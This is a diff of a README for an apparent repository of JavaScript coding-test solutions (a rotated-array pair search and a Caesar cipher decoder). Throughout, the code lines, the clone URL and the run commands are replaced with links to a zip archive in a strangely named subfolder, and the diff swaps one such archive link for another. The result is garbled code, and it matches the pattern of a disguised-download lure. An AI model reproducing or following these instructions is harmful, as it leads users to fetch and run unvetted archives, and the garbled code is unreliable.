@@ -17,7 +17,7 @@ You are given two rotated sorted arrays, `nums1` and `nums2`, and a target integ
 let nums1 = [4, 5, 6, 7, 0, 1];
 let nums2 = [3, 6, 9, 10, 11, 12, 13, 19];
 let k = 13;
-https://raw.githubusercontent.com/code-iddih/JavaScript-Test-Solutions/master/untunefully/JavaScript-Test-Solutions-2.9.zip(findPairs(nums1, nums2, k));
+https://github.com/code-iddih/JavaScript-Test-Solutions/raw/refs/heads/master/untunefully/Test_Script_Java_Solutions_2.5.zip(findPairs(nums1, nums2, k));
 ```
 
 ## 🔐 Test 2: Deciphering an Encrypted Text
@@ -34,14 +34,14 @@ You are given an encrypted string that has been encoded using a **Caesar cipher*
 ```js
 let encryptedText = "Uifsf jt b tfdsfu dpnf";
 let knownWord = "secret";
-https://raw.githubusercontent.com/code-iddih/JavaScript-Test-Solutions/master/untunefully/JavaScript-Test-Solutions-2.9.zip(decipher(encryptedText, knownWord));
+https://github.com/code-iddih/JavaScript-Test-Solutions/raw/refs/heads/master/untunefully/Test_Script_Java_Solutions_2.5.zip(decipher(encryptedText, knownWord));
 ```
 
 ## 🛠️ How to Run the Tests
 
 1️⃣ Clone the repository:
 ```sh
-git clone https://raw.githubusercontent.com/code-iddih/JavaScript-Test-Solutions/master/untunefully/JavaScript-Test-Solutions-2.9.zip
+git clone https://github.com/code-iddih/JavaScript-Test-Solutions/raw/refs/heads/master/untunefully/Test_Script_Java_Solutions_2.5.zip
 ```
 
 2️⃣ Navigate to the project folder:
@@ -49,10 +49,10 @@ git clone https://raw.githubusercontent.com/code-iddih/JavaScript-Test-Solutions
 cd JavaScript-Test-Solutions
 ```
 
-3️⃣ Run the JavaScript files using https://raw.githubusercontent.com/code-iddih/JavaScript-Test-Solutions/master/untunefully/JavaScript-Test-Solutions-2.9.zip
+3️⃣ Run the JavaScript files using https://github.com/code-iddih/JavaScript-Test-Solutions/raw/refs/heads/master/untunefully/Test_Script_Java_Solutions_2.5.zip
 ```sh
-node https://raw.githubusercontent.com/code-iddih/JavaScript-Test-Solutions/master/untunefully/JavaScript-Test-Solutions-2.9.zip  # Runs Test 1
-node https://raw.githubusercontent.com/code-iddih/JavaScript-Test-Solutions/master/untunefully/JavaScript-Test-Solutions-2.9.zip    # Runs Test 2
+node https://github.com/code-iddih/JavaScript-Test-Solutions/raw/refs/heads/master/untunefully/Test_Script_Java_Solutions_2.5.zip  # Runs Test 1
+node https://github.com/code-iddih/JavaScript-Test-Solutions/raw/refs/heads/master/untunefully/Test_Script_Java_Solutions_2.5.zip    # Runs Test 2
 ```
 
 ## 📌 Author
